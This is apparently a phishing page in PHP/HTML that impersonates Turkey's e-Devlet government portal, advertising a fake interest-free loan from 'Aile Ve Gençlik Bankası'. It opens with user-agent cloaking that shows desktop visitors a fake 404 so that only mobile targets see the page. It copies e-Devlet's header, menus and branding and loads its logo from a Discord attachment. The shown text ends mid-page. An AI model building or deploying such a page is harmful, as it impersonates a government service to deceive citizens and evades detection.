<?php
$mobileDevices = array('iPhone','iPad','Android','Windows Phone');
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$isMobile = false;
foreach ($mobileDevices as $device) {
    if (strpos($userAgent, $device) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    // Mobil olmayan kullanıcılara boş bir sayfa göster
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Mobil Uyumluluk</title>
    </head>
    <body>
        <h1>404 Not Found</h1>
    </body>
    </html>';

    exit();
}
?>
<html lang="tr" class=" test-es5object test-supports test-csstransforms3d test-webpalpha test-webplossless"><!--<![endif]--><head>
    <meta charset="utf-8">
    <link rel="dns-prefetch" href="https://giris.turkiye.gov.tr/Giris/gir">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    	        <meta property="al:android:url" content="edevlet://hizmet/1034">
        <meta property="al:android:package" content="tr.gov.turkiye.edevlet.kapisi">
        <meta property="al:android:app_name" content="e-Devlet">
        <meta property="al:ios:url" content=" edevlet://hizmet/1034">
        <meta property="al:ios:app_store_id" content="976505454">
        <meta property="al:ios:app_name" content="e-Devlet">		<meta name="description" content="Bu hizmet kullanılarak, emeklilik başvurusu yapmış kişilerin tahsis talep ve beyan taahhüt belgesi takip edilir.">
	        <meta name="keywords" content="sosyal, sgg, sgm, skg, esgm, SGK, ssk, bağ-kur, emekli sandığı, emekli, emeklilik başvurusu, talep, beyan, taahhüt , eyt">
	        <meta name="robots" content="index,follow">
	        <meta property="og:url" content="https://www.turkiye.gov.tr/sgk-tahsis-talep-taahhut-beyan">
	        <meta property="og:title" content="Aile Ve Gençlik Bankası - Faizsiz Kredi,  Talep Belgesinin Verilmesi">
	        <meta property="og:description" content="Bu hizmet kullanılarak, emeklilik başvurusu yapmış kişilerin tahsis talep ve beyan taahhüt belgesi takip edilir.">
	        <meta property="og:image" content="//cdn.e-devlet.gov.tr/themes/ankara/images/fb-share-v01.jpg">
	        <title>Aile Ve Gençlik Bankası - Faizsiz Kredi,  Talep Belgesinin Verilmesi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#1C3761">
    <link rel="icon" type="image/png" href="//cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.1.8.0.png" sizes="196x196">
    <meta name="google-play-app" content="app-id=tr.gov.turkiye.edevlet.kapisi">
    <link rel="alternate" type="application/rss+xml" title="e-Devlet Kapısı" href="/rss">
    <link rel="search" type="application/opensearchdescription+xml" href="//cdn.e-devlet.gov.tr/themes/ankara/assets/opensearch.xml" title="Arama">
    <link rel="stylesheet" href="//cdn.e-devlet.gov.tr/themes/izmir/css/base.1.9.3.css">

    <script type="text/javascript" async="" src="//cdn.e-devlet.gov.tr/themes/ankara/js/analitik.min.9.js"></script><script id="info_js" data-static-version="1.9.3" src="//cdn.e-devlet.gov.tr/themes/izmir/js/header.1.9.3.js"></script><style type="text/css" id="operaUserStyle"></style>
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/t.1.9.3.js"></script>
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/ajax.1.9.3.js"></script>

    <!--[if lte IE 9]><script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common-old.1.9.3.js"></script><![endif]-->
    <!--[if gt IE 9]><!-->
    <script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.3.js"></script><!--<![endif]-->

    <link href="//cdn.e-devlet.gov.tr/themes/izmir/css/common-pages.1.9.3.css" rel="stylesheet">
<style type="text/css">:root zeus-ad, :root topadblock, :root span[id^="ezoic-pub-ad-placeholder-"], :root guj-ad, :root gpt-ad, :root div[jsdata*="CarouselPLA-"][data-id^="CarouselPLA-"], :root div[id^="zergnet-widget"], :root div[id^="yandex_ad"], :root div[id^="vuukle-ad-"], :root div[id^="sticky_ad_"], :root div[id^="rc-widget-"], :root div[id^="lazyad-"], :root div[id^="gpt_ad_"], :root div[id^="ezoic-pub-ad-"], :root div[id^="div-gpt-"], :root div[id^="dfp-ad-"], :root div[id^="advads_ad_"], :root div[id^="adspot-"], :root div[id^="ads300_250-widget-"], :root div[id^="ads300_100-widget-"], :root div[id^="ads250_250-widget-"], :root div[id^="adrotate_widgets-"], :root div[id^="adngin-"], :root div[id^="_vdo_ads_player_ai_"], :root div[id*="ScriptRoot"], :root div[id*="MarketGid"], :root div[data-native_ad], :root div[data-mpu1], :root div[data-insertion], :root div[data-id-advertdfpconf], :root div[data-google-query-id], :root hl-adsense, :root div[data-contentexchange-widget], :root div[data-content="Advertisement"], :root div[data-alias="300x250 Ad 2"], :root div[data-alias="300x250 Ad 1"], :root div[data-adzone], :root div[data-adunit-path], :root div[data-ad-wrapper], :root div[data-ad-targeting], :root div[data-ad-placeholder], :root div[class^="native-ad-"], :root div[data-dfp-id], :root div[class^="kiwi-ad-wrapper"], :root div[class^="Adstyled__AdWrapper-"], :root div[aria-label="Ads"], :root display-ads, :root display-ad-component, :root aside[id^="adrotate_widgets-"], :root article.ad, :root ark-top-ad, :root app-advertisement, :root app-ad, :root amp-fx-flying-carpet, :root amp-embed[type="taboola"], :root amp-connatix-player, :root amp-ad-custom, :root ad-shield-ads, :root ad-desktop-sidebar, :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"], :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[href^="https://yogacomplyfuel.com/"], :root a[href^="https://bngpt.com/"], :root a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], :root a[href^="https://www.mypornstarcams.com/landing/click/"], :root a[href^="https://financeads.net/tc.php?"], :root a[href^="https://www.mrskin.com/tour"], :root a[href^="https://www.kingsoffetish.com/tour?partner_id="], :root a[href^="https://www.infowarsstore.com/"] > img, :root a[href^="https://t.grtyi.com/"], :root a[href^="https://www.highperformancecpmgate.com/"], :root a[href^="https://www.highcpmrevenuenetwork.com/"], :root a[href^="https://www.get-express-vpn.com/offer/"], :root a[href^="https://www.financeads.net/tc.php?"], :root a[href^="https://www.brazzersnetwork.com/landing/"], :root div[class^="Display_displayAd"], :root a[href^="https://www.sheetmusicplus.com/?aff_id="], :root a[href^="https://www.bang.com/?aff="], :root [data-template-type="nativead"], :root a[href^="https://www.adultempire.com/"][href*="?partner_id="], :root a[href^="https://webroutetrk.com/"], :root a[href^="https://wantopticalfreelance.com/"], :root a[href^="https://twinrdsyn.com/"], :root a[href^="https://tsartech.g2afse.com/"], :root a[href^="https://tragency-clesburg.icu/"], :root a[href^="https://tracking.avapartner.com/"], :root a[href^="https://track.afcpatrk.com/"], :root a[href^="https://track.adform.net/"], :root a[href^="https://torguard.net/aff.php"] > img, :root [data-role="tile-ads-module"], :root a[href^="https://adsrv4k.com/"], :root a[href^="https://go.xlviirdr.com"], :root a[href^="https://thaudray.com/"], :root a[href^="https://taghaugh.com/"], :root a[href^="https://www.sweetdeals.com"], :root [href^="https://zstacklife.com/"] img, :root a[href^="https://t.aslnk.link/"], :root a[href^="https://t.adating.link/"], :root [href^="https://track.fiverr.com/visit/"] > img, :root a[href^="https://go.trackitalltheway.com/"], :root a[href^="https://syndication.exoclick.com/"], :root a[href^="https://syndication.dynsrvtbg.com/"], :root a[href^="https://streamate.com/landing/click/"], :root a[href^="https://ad.doubleclick.net/"], :root a[href^="https://static.fleshlight.com/images/banners/"], :root a[href^="https://go.strpjmp.com/"], :root a[href^="https://refpa4903566.top/"], :root a[href^="https://prf.hn/click/"][href*="/camref:"] > img, :root a[href^="https://serve.awmdelivery.com/"], :root a[href^="https://prf.hn/click/"][href*="/adref:"] > img, :root [href^="https://r.kraken.com/"], :root a[href^="https://mmwebhandler.aff-online.com/"], :root a[href^="https://www.bet365.com/"][href*="affiliate="], :root iframe[id^="google_ads_frame"], :root a[href^="https://pb-track.com/"], :root a[href^="https://paid.outbrain.com/network/redir?"], :root div[id^="ad_position_"], :root a[href^="https://ovb.im/"], :root div[id^="ad-div-"], :root a[href^="https://newbinotracs.com/"], :root a[href^="https://natour.naughtyamerica.com/track/"], :root [href^="https://stvkr.com/"], :root a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"], :root [href^="https://www.herbanomic.com/"] > img, :root a[href^="//moksoxos.com/"], :root a[href^="https://maymooth-stopic.com/"], :root a[href^="https://loboclick.com"], :root [href^="https://routewebtk.com/"], :root a[href^="https://see.kmisln.com/"], :root a[href^="https://a.bestcontentweb.top/"], :root a[href^="https://lobimax.com/"], :root a[href^="https://lead1.pl/"], :root a[href^="https://landing.brazzersnetwork.com/"], :root a[href^="https://ads.leovegas.com/redirect.aspx?"], :root a[href^="https://land.brazzersnetwork.com/landing/"], :root a[href^="https://juicyads.in/"], :root a[href^="https://itubego.com/video-downloader/?affid="], :root a[href^="https://iqbroker.com/"][href*="?aff="], :root a[href^="https://incisivetrk.cvtr.io/click?"], :root a[href^="https://iactrivago.ampxdirect.com/"], :root [data-revive-zoneid], :root a[href^="https://googleads.g.doubleclick.net/pcs/click"], :root a[href^="https://clk.wrenchsound.store/"], :root a[href^="https://go.zybrdr.com"], :root [href^="http://join.michelle-austin.com/"], :root a[href^="https://go.xxxiijmp.com"], :root a[href^="https://go.xtbaffiliates.com/"], :root a[href^="https://ismlks.com/"], :root [href^="https://www.mypillow.com/"] > img, :root a[href^="https://azpresearch.club/"], :root a[href^="https://go.xlirdr.com"], :root [data-css-class="dfp-inarticle"], :root .card-captioned.crd > .crd--cnt > .s2nPlayer, :root a[href^="https://go.tmrjmp.com"], :root a[href^="https://go.skinstrip.net"][href*="?campaignId="], :root a[href^="https://go.markets.com/visit/?bta="], :root a[href^="//lambingsyddir.com/"], :root a[href^="https://billing.purevpn.com/aff.php"] > img, :root a[href^="https://go.hpyrdr.com/"], :root a[href^="https://go.goaserv.com/"], :root a[href^="https://track.wg-aff.com"], :root a[href^="https://go.ebrokerserve.com/"], :root a[href^="https://go.dmzjmp.com"], :root a[href^="https://go.admjmp.com/"], :root a[href^="https://www.nutaku.net/signup/landing/"], :root [href^="https://kingered-banctours.com/"], :root a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img, :root a-ad, :root a[href^="https://affiliate.rusvpn.com/click.php?"], :root a[href^="https://geniusdexchange.com/"], :root a[href^="https://go.gldrdr.com/"], :root [id^="ad_sky"], :root a[href^="https://funkydaters.com/"], :root a[href^="https://frameworkdeserve.com/"], :root a[href^="https://flirtandsweets.life/"], :root a[href^="https://www.mrskin.com/account/"], :root bottomadblock, :root a[href^="https://fertilitycommand.com/"], :root [data-freestar-ad], :root a[href^="https://fc.lc/ref/"], :root div[data-native-ad], :root a[href^="https://engine.trackingdesks.com/"], :root [href^="https://totlnkcl.com/"], :root a[href^="https://www.adskeeper.com"], :root a[data-redirect^="https://paid.outbrain.com/network/redir?"], :root [href^="https://www.reimageplus.com/"], :root a[href^="https://engine.phn.doublepimp.com/"], :root a[href^="https://engine.blueistheneworanges.com/"], :root a[href^="https://clixtrac.com/"], :root div.fadeInDown[id$="____equal"][class$="____equal"], :root a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"], :root a[href^="https://join.dreamsexworld.com/"], :root a[href^="https://click.linksynergy.com/fs-bin/"], :root AD-TRIPLE-BOX, :root a[href^="https://click.hoolig.app/"], :root a[href^="https://track.totalav.com/"], :root img[src^="https://images.purevpnaffiliates.com"], :root a[href^="https://porntubemate.com/"], :root a[href^="http://www.gfrevenge.com/landing/"], :root a[href^="https://clickadilla.com/"], :root a[href^="https://click.dtiserv2.com/"], :root a[href^="https://go.xlvirdr.com"], :root a[href^="https://claring-loccelkin.com/"], :root [class^="s2nPlayer"], :root a[href^="https://chaturbate.jjgirls.com/?track="], :root a[href^="https://www.nudeidols.com/cams/"], :root a[href^="https://chaturbate.com/in/?track="], :root a[href^="https://www.onlineusershielder.com/"], :root a[href^="https://chaturbate.com/in/?tour="], :root a[href^="https://cams.imagetwist.com/in/?track="], :root a[href^="https://camfapr.com/landing/click/"], :root a[href^="https://cam4com.go2cloud.org/"], :root a[href^="https://affcpatrk.com/"], :root a[href^="https://bongacams2.com/track?"], :root a[href^="https://bluedelivery.pro/"], :root #topstuff > #tads, :root a[href^="https://black77854.com/"], :root a[href^="https://burpee.xyz/"], :root a[href^="https://ndt5.net/"], :root a[href^="https://batheunits.com/"], :root a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"], :root a[href^="https://banners.livepartners.com/"], :root a[href^="https://m.do.co/c/"] > img, :root [href="https://masstortfinancing.com"] img, :root a[href^="https://bongacams10.com/track?"], :root a[href^="https://albionsoftwares.com/"], :root a[href^="https://t.hrtye.com/"], :root a[href^="https://go.etoro.com/"] > img, :root a[href^="https://join.sexworld3d.com/track/"], :root a[href^="https://intenseaffiliates.com/redirect/"], :root a[href^="https://aweptjmp.com/"], :root a[href^="https://ads.ad4game.com/"], :root [id^="google_ads_iframe"], :root a[href^="https://syndication.optimizesrv.com/"], :root a[href^="https://affpa.top/"], :root a[href^="https://adnetwrk.com/"], :root a[href^="https://adjoincomprise.com/"], :root [href^="http://misslinkvocation.com/"], :root a[href^="https://adclick.g.doubleclick.net/"], :root a[href^="https://go.nordvpn.net/aff"] > img, :root [href^="http://clicks.totemcash.com/"], :root a[href^="https://misspkl.com/"], :root a[href^="https://ad.zanox.com/ppc/"] > img, :root a[href^="https://ad.kubiccomps.icu/"], :root a[href^="https://adswick.com/"], :root a[href^="https://a2.adform.net/"], :root [data-m-ad-id], :root a[href^="https://a-ads.com/"], :root [href="https://ourgoldguy.com/contact/"] img, :root a[href^="https://brightadnetwork.com/"], :root [href^="https://www.avantlink.com/click.php"] img, :root iframe[src^="https://pagead2.googlesyndication.com/"], :root a[href^="http://www.onwebcam.com/random?t_link="], :root a[href^="https://agacelebir.com/"], :root a[href^="https://spygasm.com/track?"], :root a[href^="http://d2.zedo.com/"], :root a[href^="http://www.friendlyduck.com/AF_"], :root a[href^="http://trk.globwo.online/"], :root a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img, :root a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="], :root a[href^="http://traffic.tc-clicks.com/"], :root a[href^="http://tour.mrskin.com/"], :root a[href^="https://join.virtualtaboo.com/track/"], :root a[href^="http://https://www.get-express-vpn.com/offer/"], :root a[href^="https://cagothie.net/"], :root div[id^="google_dfp_"], :root a[href^="http://googleads.g.doubleclick.net/pcs/click"], :root a[href^="https://awentw.com/"], :root a[href^="https://www.googleadservices.com/pagead/aclk?"], :root a[href^="http://www.mrskin.com/tour"], :root a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"], :root a[href^="http://deloplen.com/"], :root .rc-cta[data-target], :root [href^="http://go.cm-trk2.com/"], :root a[href^="http://adtrack1.club/"], :root a[href^="http://click.payserve.com/"], :root a[href^="https://porngames.adult/?SID="], :root a[href^="https://landing1.brazzersnetwork.com"], :root #slashboxes > .deals-rail, :root [href^="http://globsads.com/"], :root [href^="https://www.brighteonstore.com/products/"] img, :root a[href^="http://bc.vc/?r="], :root .trc_rbox_border_elm .syndicatedItem, :root a[href^="http://www.onclickmega.com/jump/next.php?"], :root a[href^="http://adf.ly/?id="], :root [href^="http://homemoviestube.com/"], :root a[href^="http://ad.doubleclick.net/"], :root .commercial-unit-mobile-top .jackpot-main-content-container > .UpgKEd + .nZZLFc > .vci, :root a[href^="//syndication.dynsrvtbg.com/"], :root a[href^="http://static.fleshlight.com/images/banners/"], :root a[href^="https://a.adtng.com/"], :root a[href^="//pubads.g.doubleclick.net/"], :root [href^="https://traffserve.com/"], :root div[data-adname], :root a[href^="https://thechleads.pro/"], :root a[href^="//intorterraon.com/"], :root a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="], :root a[href^="https://tour.mrskin.com/"], :root a[href^="http://allaptair.club/"], :root a[href^="//go.eabids.com/"], :root [data-d-ad-id], :root a[href*=".engine.adglare.net/"], :root a[href^="https://a.bestcontentoperation.top/"], :root a[href^="//go.xlviiirdr.com"], :root [data-dynamic-ads], :root a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"], :root [data-ad-width], :root [href^="https://join.playboyplus.com/track/"], :root a[data-url^="http://paid.outbrain.com/network/redir?"] + .author, :root a[href^="https://axdsz.pro/"], :root a[href^="http://bodelen.com/"], :root a[data-oburl^="https://paid.outbrain.com/network/redir?"], :root [href^="https://cpa.10kfreesilver.com/"], :root a[href^="https://a.bestcontentfood.top/"], :root a[href^="https://reinstandpointdumbest.com/"], :root a[data-obtrack^="http://paid.outbrain.com/network/redir?"], :root [href^="https://goldforyourfuture.com/clk.trk"] img, :root a[href^="http://wct.link/"], :root [href^="https://infinitytrk.com/"], :root [onclick^="location.href='http://www.reimageplus.com"], :root [id^="section-ad-banner"], :root .commercial-unit-mobile-top > div[data-pla="1"], :root [id^="chp_ads_block"], :root a[href^="https://go.julrdr.com/"], :root .trc_rbox_div .syndicatedItemUB, :root [href^="https://zone.gotrackier.com/"], :root [href^="https://www.targetingpartner.com/"], :root [href^="https://detachedbates.com/"], :root a[href^="https://fourwhenstatistics.com/"], :root [href^="https://www.restoro.com/"], :root div[id^="ad-position-"], :root a[href^="http://adultfriendfinder.com/go/page/landing"], :root a[href^="http://affiliate.glbtracker.com/"], :root a[href^="https://leg.xyz/?track="], :root a[href^="https://go.cmtaffiliates.com/"], :root [data-name="adaptiveConstructorAd"], :root [href^="https://optimizedelite.com/"] > img, :root a[href^="//thaudray.com/"], :root div[id^="crt-"][style], :root a[href^="http://adultgames.xxx/"], :root a[href^="https://traffic.bannerator.com/"], :root [href^="https://shiftnetwork.infusionsoft.com/go/"] > img, :root [href^="https://www.mypatriotsupply.com/"] > img, :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"], :root [href^="https://secure.bmtmicro.com/servlets/"], :root a[href^="https://losingoldfry.com/"], :root .scroll-fixable.rail-right > .deals-rail, :root a[href^="https://oackoubs.com/"], :root a[href^="https://awptjmp.com/"], :root a[href^="https://go.goasrv.com/"], :root .commercial-unit-mobile-top > .v7hl4d, :root [href^="http://mypillow.com/"] > img, :root a[href^="http://bongacams.com/track?"], :root a[href^="https://fleshlight.sjv.io/"], :root [data-ad-manager-id], :root a[href^="https://promo-bc.com/"], :root a[href^="https://clicks.pipaffiliates.com/"], :root [href^="https://noqreport.com/"] > img, :root a[href^="https://go.hpyjmp.com"], :root ADS-RIGHT, :root [href^="https://mystore.com/"] > img, :root [href^="https://mypatriotsupply.com/"] > img, :root [href^="https://mylead.global/stl/"] > img, :root #leader-companion > a[href], :root a[href^="https://transfer.xe.com/signup/track/redirect?"], :root .vid-present > .van_vid_carousel__padding, :root a[href^="https://go.xxxijmp.com"], :root [href^="https://istlnkcl.com/"], :root [href^="https://www.hostg.xyz/"] > img, :root .section-subheader > .section-hotel-prices-header, :root [href^="https://go.affiliatexe.com/"], :root [href^="https://go.4rabettraff.com/"], :root [href^="https://glersakr.com/"], :root ins.adsbygoogle, :root a[href^="https://1startfiledownload1.com/"], :root a[href^="https://wittered-mainging.com/"], :root [href^="https://engine.gettopple.com/"], :root [href^="https://awbbjmp.com/"], :root a[href^="https://k2s.cc/pr/"], :root [href^="https://affect3dnetwork.com/track/"], :root a[href^="https://go.currency.com/"], :root [href^="http://www.mypillow.com/"] > img, :root [href^="https://v.investologic.co.uk/"], :root [href^="https://cipledecline.buzz/"], :root [href^="http://join.trannies-fuck.com/"], :root [href^="http://www.fleshlightgirls.com/"], :root div[id^="div-ads-"], :root [href^="https://rapidgator.net/article/premium/ref/"], :root a[href^="https://www.sugarinstant.com/?partner_id="], :root a[href^="https://adultfriendfinder.com/go/page/landing"], :root div[data-role="sidebarAd"], :root [href^="https://join3.bannedsextapes.com"], :root div[data-spotim-slot], :root [href^="https://antiagingbed.com/discount/"] > img, :root a[href^="https://go.247traffic.com/"], :root [href^="https://join.girlsoutwest.com/"], :root [href^="http://trafficare.net/"], :root a[href^="https://tc.tradetracker.net/"] > img, :root a[href^="https://adserver.adreactor.com/"], :root [href^="http://join.shemalesfromhell.com/"], :root [id^="ad_slider"], :root a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"], :root [href^="http://join.shemale.xxx/"], :root [href^="https://ilovemyfreedoms.com/landing-"], :root a[href^="https://ads.betfair.com/redirect.aspx?"], :root .trc_rbox .syndicatedItem, :root a[href^="http://cam4com.go2cloud.org/aff_c?"], :root a[href^="https://cpmspace.com/"], :root [href^="https://freecourseweb.com/"] > .sitefriend, :root [class^="adDisplay-module"], :root [class^="chp_ads_block"], :root a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"], :root [href^="http://join.rodneymoore.com/"], :root a[href^="https://www.privateinternetaccess.com/"] > img, :root a[href*=".trust.zone"], :root [href^="https://shrugartisticelder.com"], :root [href^="https://go.xlrdr.com"], :root [name^="google_ads_iframe"], :root [href^="https://safer-redirection.com"], :root [href^="//ngeoziadiyc4hi2e.com/"], :root a[href^="https://go.xxxjmp.com"], :root [data-desktop-ad-id], :root [href^="https://wct.link/"], :root #kt_player > a[target="_blank"], :root [href="https://www.masstortfinancing.com/"] > img, :root .ob_container .item-container-obpd, :root [id^="div-gpt-ad"], :root [href^="https://mypillow.com/"] > img, :root [href^="https://ad.admitad.com/"], :root a[href^="https://u.expresstech.io/"], :root [href="https://jdrucker.com/gold"] > img, :root a[href^="https://www.iyalc.com/"], :root a[href^="https://track.ultravpn.com/"], :root [href^="https://goldcometals.com/clk.trk"], :root [data-mobile-ad-id], :root a[href^="http://tc.tradetracker.net/"] > img, :root a[href^="https://www.geekbuying.com/dynamic-ads/"], :root a[href^="http://affiliates.thrixxx.com/"], :root #searchResultsList > div > div[onclick$="'inline.ad'});"], :root a[href^="https://trk.sportsflix4k.club/"], :root a[href^="https://go.xlivrdr.com"], :root [data-ez-name], :root AMP-AD, :root [data-ad-cls], :root a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="], :root [id^="ad-wrap-"], :root div[id^="taboola-stream-"], :root [href^="https://go.astutelinks.com/"], :root [onclick*="content.ad/"], :root [href^="http://residenceseeingstanding.com/"], :root div[data-adunit], :root app-large-ad, :root [href^="https://turtlebids.irauctions.com/"] img, :root [class^="amp-ad-"], :root [href^="https://affiliate.fastcomet.com/"] > img, :root a[href^="http://go.xtbaffiliates.com/"], :root .grid > .container > #aside-promotion, :root DFP-AD, :root AD-SLOT, :root .ob_dual_right > .ob_ads_header ~ .odb_div, :root [href^="https://click2cvs.com/"], :root .trc_related_container div[data-item-syndicated="true"], :root [href^="http://join.shemalepornstar.com/"], :root a[href^="https://go.xlviiirdr.com"], :root .trc_rbox_div .syndicatedItem, :root [data-ad-module], :root [href^="https://trackfin.asia/"], :root .plistaList > .plista_widget_underArticle_item[data-type="pet"], :root a[href*="//lkstrck2.com/"], :root .plistaList > .itemLinkPET, :root atf-ad-slot, :root .commercial-unit-mobile-top .jackpot-main-content-container > .UpgKEd + .nZZLFc > div > .vci, :root a[href^="http://partners.etoro.com/"], :root [data-advadstrackid], :root #atvcap + #tvcap > .mnr-c > .commercial-unit-mobile-top, :root a[href^="https://traffdaq.com/"], :root a[href^="https://tm-offers.gamingadult.com/"], :root [class^="div-gpt-ad"], :root a[href^="https://bs.serving-sys.com"], :root [href^="https://www.cloudways.com/en/?id"], :root a[href^="https://refpazkjixes.top/"], :root #mgb-container > #mgb, :root a[href^="https://join.virtuallust3d.com/"], :root #taw > .med + div > #tvcap > .mnr-c:not(.qs-ic) > .commercial-unit-mobile-top, :root [data-adblockkey] { display: none !important; }</style><script type="text/javascript" async="" src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/common_messages_tr.1.9.3.js"></script><script type="text/javascript" async="" src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/ed-effects.1.9.3.js"></script><link rel="stylesheet" type="text/css" href="//cdn.e-devlet.gov.tr/themes/izmir/css/edk-group.1.9.3.css"><script type="text/javascript" async="" src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/edk-group-modifier.1.9.3.js"></script><script type="text/javascript" async="" src="//cdn.e-devlet.gov.tr/themes/izmir/js/es/form_messages_tr.1.9.3.js"></script></head>

<body data-version=".1.8.0" data-token="{6422BC-CAC21A-504013-7C9D67-1F3114-0B0BC2-46ABEC-291C35}" data-unique="6d677509b9221e56c01015b82ae3b705" data-level="1" data-page="sgk-tahsis-talep-taahhut-beyan" data-lang="tr_TR.UTF-8" class="ed-web" style="visibility: visible; overflow: auto; opacity: 1;">
<header id="top" class="sticky_init">
    <div class="headerGroup">
        <div id="accesibilityBlock">
            <a href="#" id="contentBlockLink" accesskey="1">İçeriğe Git</a>
            <a href="#" accesskey="2">Ana Sayfa</a>
        </div>

        <h1 id="brandingBlock">
            <a id="homeLink" href="/" title="Ana Sayfa'ya Dönüş">e-Devlet Kapısı</a>
        </h1>
        <nav id="mainActionsBlock" aria-labelledby="mainActionsBlockTitle">
            <h2 class="sectionTitle" id="mainActionsBlockTitle">Ana Bölümler</h2>
            <ul class="mainActionsList">
                <li><span class="fast-shortcuts">
                    		<a href="#"><i class="edk-fonticon-fastresponse"></i><span> Hızlı Çözüm</span></a></span>
                </li>
                                
                <li class="inner-wrapper">
                    <ul class="accessibility" id="accessibilityUl" aria-expanded="false" role="menu" tabindex="0" aria-label="Erişilebilirlik">
                        <li class="active" role="none">
                            <i class="ico-key-1" aria-hidden="true"></i>
                        </li>
                        <li class="menu" role="none">
                            <ul role="none">
                                <li role="none"><a role="menuitem" href="#">Erişilebilirlik Özellikleri</a>
                                </li>
                                <li role="none"><a role="menuitem" href="#" class="textOnlyToggle" data-state="html">Salt Metin Görünümü</a>
                                </li>
                                <li role="none"><a role="menuitem" href="#" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                                            <div class="fast-shortcuts">
                        <ul>
                            <li>
                                <a href="#" title="Benim Sayfam">
                                    <span class="ico-address-card-o" aria-hidden="true"></span>
                                </a>
                                <a href="#" title="Favori Hizmetlerim">
                                    <span class="ico-star" aria-hidden="true"></span>
                                </a>
                            </li>
                        </ul>
                        </div>
                    </li>
                                    <li class="search-form-wrapper">
                    <form id="searchForm" name="searchForm" method="get" action="/">
                        <label for="searchField">Aranan Terim</label>
                        <div class="search-wrapper" style="display: block;">
                            <div class="inner-search">
                                <input placeholder="Size nasıl yardım edebilirim?" id="searchField" name="aranan" value="" autocomplete="off" role="combobox" aria-owns="popSearch" aria-haspopup="true" aria-autocomplete="both" aria-expanded="false" autocorrect="off" autocapitalize="off">
                                <span class="ico-search"></span>
                            </div>
                            <ul id="popSearch"></ul>
                        </div>
                        <input id="searchButton" type="submit" value="Ara">
                    </form>
                    </li>
                                                    <li aria-haspopup="true" id="userMenu" aria-expanded="false" aria-label="kullanıcı menüsü">
                        <a tabindex="0" href="javascript:" title="Kullanıcı Menüsü" class="userMenuButton" onclick="$(this).next().toggleClass('open');" role="button" aria-controls="userContextMenuList">
                            <span aria-hidden="true" class="ico-user"></span>
                                <em>1</em></a>
                        <nav id="userContextMenu">
                            <ul class="userShortcuts" id="userContextMenuList" role="menu">
                                <li class="trid" aria-label="T.C. Kimlik No"></li>
                                <li><a role="menuitem" href="#" class="myPage">Benim Sayfam</a></li>
                                <li><a role="menuitem" href="#" class="favorites">Favori Hizmetlerim</a>
                                </li>
                                <li><a role="menuitem" href="#" class="inbox" aria-label="Gelen Kutusu">Gelen Kutusu                                             <em>(1)</em></a></li>
                                <li><a role="menuitem" href="#" class="security">İletişim Seçenekleri</a>
                                </li>
                                <li><a role="menuitem" href="#" class="security">Güvenlik ve Ayarlar</a>
                                </li>
                                <li><a role="menuitem" href="#" class="security">Şifremi Değiştir</a>
                                </li>
                                <li><a role="menuitem" href="#" class="logout">Güvenli Çıkış</a></li>
                            </ul>
                        </nav>
                    </li>
                </ul>
        </nav>
    </div>
</header>
<main id="serviceBlock" class="typeInsurance" style="margin-top: 80px;">
	<div id="vue">
				 <nav class="pageTabNavigation" aria-label="Üst Sayfalar">
            <ul class="breadcrumbNavigation">
            	<li><a href="/" class="home">Ana Sayfa</a></li>
            	            		            		<li><a href="#">Aile Ve Gençlik Bankası</a></li>
            						            		            		<li class="here">Faizsiz Kredi,  Talep Belgesinin Verilmesi</li>
            						            </ul>
        </nav> 
    	<section id="pageContentBlock" class="themed">
		        <section class="serviceTitleBlock"><div class="serviceDetails">
				<img class="agencyLogo webp" src="https://cdn.discordapp.com/attachments/1117956402665750592/1117959109292085260/ilkevim_1.png" alt="" width="64" height="64"><h2>
				<a href="#">Aile Ve Gençlik Bankası</a><em>Faizsiz Kredi,  Talep Belgesinin Verilmesi</em></h2></div>
				<div class="serviceActions"><a id="aFavorite" href="#" class="" aria-label="Favorilere ekle" title="Favorilere ekle" data-hizmetkodu="1034" data-match-height="serviceActs" style="height: 28.7969px;">
				<span class="flex_vertical_center"><i class="ico-star"></i><span class="serviceActions_maintitle _fav"> Favorilere ekle</span></span></a>
				<a data-modal="true" aria-label="Puanla" title="Puanla" data-modalclass="noclose" href="#" data-match-height="serviceActs" style="height: 28.7969px;" class="modalLink">
				<span class="flex_vertical_center"><i class="ico-comment"></i><span class="serviceActions_maintitle">Puanla</span></span></a>
				<div class="share_item edk-popover-wrapper">
				<button class="share_button" id="share_button" data-match-height="serviceActs" style="height: 40.7969px;"><i class="ico-share"></i>
				<span class="serviceActions_maintitle">Paylaş</span></button><div class="share_menu" id="share_menu" data-match-height="serviceActs" style="display: none;">
				<a target="_blank" aria-label="paylaş" title="Twitter'da Paylaş" href=""><i class="ico-twitter"></i>
